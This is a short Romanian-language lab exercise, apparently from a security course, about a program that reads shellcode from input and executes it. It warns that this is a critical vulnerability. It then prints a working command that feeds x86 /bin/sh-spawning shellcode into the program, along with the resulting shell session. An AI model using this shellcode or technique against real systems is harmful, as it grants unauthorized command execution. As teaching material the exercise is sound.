# Shellcode input

Similar cu exercițiul anterior, exercițiul curent nu va mai avea inițializată variabila `shellcode`, ci o va citi ca input.

Shellcode-ul este fix același ca la exercițiul anterior.

Citirea codului `assembly` de la tastatură și execuția lui sunt considerate vulnerabilități critice.
Nu uitați acest lucru.

Pentru a exploata vulnerabilitatea, folosiți:

``` shell
cat <(echo -en "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80") - | ./shellcode-input
```

Rezultatul ar trebui să fie:

``` shell
$ cat <(echo -en "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80") - | ./shellcode-input
whoami
kali
```
